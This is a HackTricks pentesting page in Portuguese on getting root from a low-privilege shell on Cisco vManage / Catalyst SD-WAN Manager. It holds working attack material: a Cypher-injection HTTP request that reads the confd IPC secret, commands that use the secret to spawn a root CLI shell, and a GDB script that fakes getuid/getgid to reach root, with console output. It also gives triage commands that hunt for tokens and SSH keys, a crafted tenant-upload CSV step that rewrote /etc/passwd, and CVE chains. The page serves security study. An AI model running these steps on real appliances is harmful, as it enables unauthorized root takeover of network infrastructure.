# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Uma vez que você tenha execução de código em Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin`, ou `vmanage-admin`, as superfícies locais mais interessantes de privesc costumam ser a stack de CLI `confd`, o helper `cmdptywrapper`, as REST APIs em localhost, e os handlers de import/upload com owner root.

Se você ainda precisar do **initial foothold** em um controller, confira primeiro a página dedicada do control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` for legível a partir da sua foothold, Path 1 e Path 2 tornam-se imediatamente práticas. Se você chegou por meio de um remote info leak ou de um webshell, também verifique se já consegue acessar material SSH de `vmanage-admin` ou handlers de upload de multitenancy: pesquisas de 2026 mostraram que ambos eram degraus de escalada realistas.

## Path 1

(Exemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Depois de investigar um pouco alguma [documentation](http://66.218.245.39/doc/html/rn03re18.html) relacionada ao `confd` e aos diferentes binaries (acessível com uma conta no website da Cisco), descobrimos que, para autenticar o socket IPC, ele usa um secret localizado em `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Lembra da nossa instância Neo4j? Ela está executando com os privilégios do usuário `vmanage`, permitindo-nos recuperar o arquivo usando a vulnerabilidade anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
O programa `confd_cli` não suporta argumentos de linha de comando, mas chama `/usr/bin/confd_cli_user` com argumentos. Então, poderíamos chamar diretamente `/usr/bin/confd_cli_user` com nosso próprio conjunto de argumentos. No entanto, ele não é legível com nossos privilégios atuais, então precisamos recuperá-lo do rootfs e copiá-lo usando scp, ler a ajuda e usá-lo para obter o shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

O blog¹ da equipe synacktiv descreveu uma forma elegante de obter um root shell, mas o porém é que isso requer obter uma cópia do `/usr/bin/confd_cli_user`, que só é legível por root. Encontrei outra forma de escalar para root sem esse trabalho.

Quando desmontei o binário `/usr/bin/confd_cli`, observei o seguinte:

<details>
<summary>Objdump mostrando coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quando eu executo “ps aux”, observei o seguinte (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Eu hipotetizei que o programa “confd_cli” passa o ID de usuário e o ID de grupo que ele coletou do usuário logado para a aplicação “cmdptywrapper”.

Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e fornecer `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum ponto do caminho e eu não consigo falsificá-lo.

Como mencionado no blog da synacktiv (último exemplo), o programa “confd_cli” não suporta argumento de linha de comando, mas posso influenciá-lo com um debugger e, felizmente, o GDB está incluído no sistema.

Criei um script GDB no qual forcei a API `getuid` e `getgid` a retornarem 0. Como eu já tenho privilégio “vmanage” por meio do deserialization RCE, tenho permissão para ler diretamente o `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 falha de validação de entrada no CLI - CVE-2025-20122)

Posteriormente, a Cisco documentou um caminho local mais limpo para root em seu próprio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): um **atacante autenticado com apenas privilégios read-only** poderia enviar uma request forjada ao manager CLI e elevar para root por causa de validação de entrada insuficiente.

Do ponto de vista ofensivo, esta é a principal conclusão:

1. Depois de ter *qualquer* foothold de low-priv na máquina, você deve testar o serviço local do CLI antes de partir para o workflow mais pesado do Path 1 / Path 2.
2. Reutilize os artifacts do Path 2 para encontrar o trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trate cada campo encaminhado para o backend do CLI como suspeito: UID/GID, username, terminal metadata, imported files, ou qualquer valor consumido depois por um helper com root.
4. Se um usuário low-priv conseguir alcançar o socket local do CLI e influenciar esses campos, root pode estar a apenas uma request forjada de distância.

Um workflow prático após entrar no appliance é:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Isso transforma o bug de 2025 em um bom padrão de hunting para versões semelhantes: procure por **local CLI shims que coletam identity em userland e encaminham isso para um wrapper mais privilegiado**.

Não confunda **CVE-2025-20122** com a posterior **CVE-2026-20122**: o problema de 2025 é um bug *local* de CLI-to-root, enquanto o problema de 2026 é um *remote* arbitrary file overwrite em API, que é mais útil para plantar um foothold e depois revisitar Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

O advisory de fevereiro de 2026 da Cisco também introduziu outra classe útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitia que um **authenticated, local attacker with low privileges** obtivesse root por causa de um mecanismo insuficiente de user-authentication na REST API.

Isso importa porque o privesc no vManage não se limita mais a abuso de `confd`/TTY. Depois de obter uma shell com low priv, também procure por:

- endpoints de API apenas localhost que confiam demais no caller
- tokens, cookies ou service credentials legíveis a partir da conta atual
- ações apenas de root expostas por handlers `dataservice`/REST que ainda podem ser acionadas localmente

Na prática, uma vez que você tenha uma shell como `vmanage` ou outro service user, o abuso local da API costuma ser mais silencioso e mais fácil de automatizar do que o abuso interativo da CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se a contexto da sessão local for suficiente para atingir funcionalidade REST privilegiada, prefira o caminho da API: é mais fácil de repetir, automatizar e encadear com sessões web roubadas ou tokens de API.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Outro padrão recente é [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): um atacante local com privilégios `netadmin` podia fazer upload de um **crafted file** que depois era tratado de forma insegura pelo CLI, levando a command injection como `root`.

Do ponto de vista do HackTricks, a técnica valiosa é mais ampla do que o CVE específico:

1. Enumere cada workflow de CLI ou web que aceite um arquivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Rastreie onde o arquivo enviado é gravado e qual script ou binário owned by root o consome.
3. Teste se o filename, o conteúdo do arquivo ou metadata parseada é alguma vez passado para shell commands, wrapper scripts ou helpers no estilo `system()`.
4. Se você já consegue alcançar `netadmin` (credenciais válidas, sessão roubada ou uma cadeia de auth-bypass), bugs de processamento de arquivos costumam ser o caminho mais rápido para root.

Google Cloud / Mandiant mais tarde mostrou uma instância muito concreta dessa classe de bug sendo explorada através do caminho de importação de multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
No ataque observado, o CSV criado acabou modificando `/etc/passwd` e `/etc/shadow` para criar uma conta temporária com UID 0 (`troot`). Isso torna importadores no estilo `tenant-upload` / `tenant-list` especialmente interessantes: eles não são apenas recursos de ingestão de dados, mas potenciais front-ends de parser com propriedade de root.

Um padrão rápido de hunting no lado do shell é:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
This bug class encadeia especialmente bem com footholds remotos que concedem `netadmin` mas não `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Especialmente de alto valor porque pesquisas públicas mostraram que ele poderia expor `confd_ipc_secret` ou a chave privada `vmanage-admin`, transformando um bug de leitura em Path 1 ou em um pivot NETCONF.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Diferente do bug de CLI de 2025 acima; a VulnCheck o usou para fazer upload de um webshell, o que torna imediatamente relevantes os caminhos locais de privesc nesta página.
- **Authenticated UI XSS (CVE-2024-20475)** – Roube uma sessão de admin na web UI e então faça pivot para ações de API/CLI que eventualmente alcancem `vshell` ou um dos caminhos locais de privesc acima.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Precursor muito forte para Path 5 porque `netadmin` é exatamente o nível exigido pelo privesc de crafted-file de 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Valor ofensivo semelhante ao CVE-2026-20122, mas por meio de um caminho posterior de upload na web UI: escreva em um local que depois será processado por root ou pela camada web do plano de gerenciamento.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – As intrusões de 2026 mostraram que atacantes podem fazer rollback para uma versão antiga e vulnerável do SD-WAN, abusar do velho bug de root via CLI e então restaurar a versão original.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Melhor documentado na página dedicada ao control-plane do SD-WAN; ele pode anexar uma chave SSH para `vmanage-admin`, dando a você o foothold local necessário para revisitar esta página.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
